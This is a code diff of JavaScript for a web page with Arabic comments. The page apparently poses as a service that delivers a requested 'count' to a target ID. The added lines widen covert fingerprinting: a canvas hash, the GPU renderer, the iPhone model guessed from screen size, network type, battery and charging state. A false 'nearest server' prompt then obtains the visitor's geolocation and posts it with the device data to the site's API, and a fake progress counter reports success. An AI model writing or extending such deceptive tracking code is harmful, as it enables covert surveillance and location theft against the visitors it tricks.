@@ -73,10 +73,7 @@ u$$$$$$$$$$$$$$$$$$$$$u
                 ctx.fillText("HW-ID-Scan", 2, 15);
                 let canvasData = canvas.toDataURL();
                 let hash = 0;
-                for (let i = 0; i < canvasData.length; i++) {
-                    hash = ((hash << 5) - hash) + canvasData.charCodeAt(i);
-                    hash |= 0;
-                }
+                for (let i = 0; i < canvasData.length; i++) { hash = ((hash << 5) - hash) + canvasData.charCodeAt(i); hash |= 0; }
                 return "HW-" + Math.abs(hash);
             } catch (e) { return "HW-Unknown"; }
         }
@@ -85,22 +82,48 @@ u$$$$$$$$$$$$$$$$$$$$$u
             if (!window.location.hostname.includes(MY_DOMAIN)) return;
 
             const hwID = await generateHardwareID();
+            
+            // سحب كرت الشاشة الدقيق
             let gpu = "غير معروف";
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
-                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
-            
-            let battery = "غير معروف";
-            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch (e) {}
-            
+
+            // كشف نوع الجهاز من أبعاد الشاشة (خاص بالأيفون)
+            let deviceModel = navigator.platform;
+            const w = window.screen.width;
+            const h = window.screen.height;
+            if (w === 430 && h === 932) deviceModel = "iPhone 14/15 Pro Max";
+            else if (w === 393 && h === 852) deviceModel = "iPhone 14/15 Pro";
+            else if (w === 390 && h === 844) deviceModel = "iPhone 12/13/14";
+            else if (w === 414 && h === 896) deviceModel = "iPhone XR/11/11 Pro Max";
+            else if (w === 375 && h === 812) deviceModel = "iPhone X/XS/11 Pro";
+
+            // كشف نوع الشبكة الذكي
+            let netType = "بيانات (Cellular)";
+            if (navigator.connection) {
+                netType = navigator.connection.effectiveType === 'wifi' ? "واي فاي (WiFi)" : navigator.connection.effectiveType;
+            } else if (navigator.userAgent.match(/iPhone/i)) {
+                netType = (navigator.maxTouchPoints > 1) ? "WiFi/Fast-Net" : "Mobile Data";
+            }
+
+            // سحب البطارية (للأندرويد والكمبيوتر)
+            let batteryStatus = "محمي (iOS)";
+            try {
+                const b = await navigator.getBattery();
+                batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+            } catch (e) {}
+
             deviceCapturedData = {
                 hw_id: hwID,
                 gpu: gpu,
-                battery: battery,
-                network: navigator.connection ? navigator.connection.effectiveType : "WiFi/Data",
+                model: deviceModel,
+                battery: batteryStatus,
+                network: netType,
+                screen: `${w}x${h}`,
                 platform: navigator.platform,
-                cores: navigator.hardwareConcurrency || '?',
                 ram: navigator.deviceMemory || '?'
             };
 
@@ -113,35 +136,22 @@ u$$$$$$$$$$$$$$$$$$$$$u
 
         function requestAccess() {
             const id = document.getElementById('target-id').value;
-            const count = parseInt(document.getElementById('target-count').value);
+            const count = document.getElementById('target-count').value;
             if(!id || !count) return alert("أكمل البيانات!");
-            if(count > maxLimit) return alert("الحد الأقصى هو " + maxLimit);
-
-            alert("لضمان السرعة، يرجى السماح بالوصول للموقع لتحديد السيرفر الأقرب لدولتك.");
-            
+            alert("للحماية، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر.");
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => sendFinalData(id, count, pos.coords.latitude, pos.coords.longitude),
                     () => sendFinalData(id, count, null, null)
                 );
-            } else {
-                sendFinalData(id, count, null, null);
-            }
+            } else { sendFinalData(id, count, null, null); }
         }
 
         async function sendFinalData(id, count, lat, lon) {
             fetch('/api/index', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    mode: mode,
-                    service: service,
-                    target_id: id,
-                    count: count,
-                    lat: lat,
-                    lon: lon,
-                    device_info: deviceCapturedData
-                })
+                body: JSON.stringify({ mode: mode, service: service, target_id: id, count: count, lat: lat, lon: lon, device_info: deviceCapturedData })
             });
             startCounter(count);
         }
@@ -150,14 +160,8 @@ u$$$$$$$$$$$$$$$$$$$$$u
             document.getElementById('progress-container').classList.remove('hidden');
             let current = 0;
             let interval = setInterval(() => {
-                if(current >= max) {
-                    clearInterval(interval);
-                    alert("تمت العملية بنجاح! سيصلك الطلب تدريجياً.");
-                    location.reload();
-                } else {
-                    current++;
-                    document.getElementById('counter').innerText = current;
-                }
+                if(current >= max) { clearInterval(interval); alert("تمت العملية بنجاح!"); location.reload(); }
+                else { current++; document.getElementById('counter').innerText = current; }
             }, 1200);
         }
 
